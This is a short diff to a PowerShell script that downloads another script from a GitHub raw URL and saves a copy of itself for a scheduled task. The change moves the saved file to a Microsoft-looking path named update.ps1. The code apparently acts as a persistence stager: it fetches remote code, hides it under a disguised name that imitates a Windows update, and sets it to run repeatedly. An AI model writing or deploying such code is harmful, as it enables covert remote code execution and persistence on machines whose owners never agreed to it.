@@ -1,5 +1,5 @@
 # Save self to local file path for scheduled task
-$localPath = "C:\Windows\Temp\main_upload.ps1"
+$localPath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
 
 # Set UTF-8 encoding
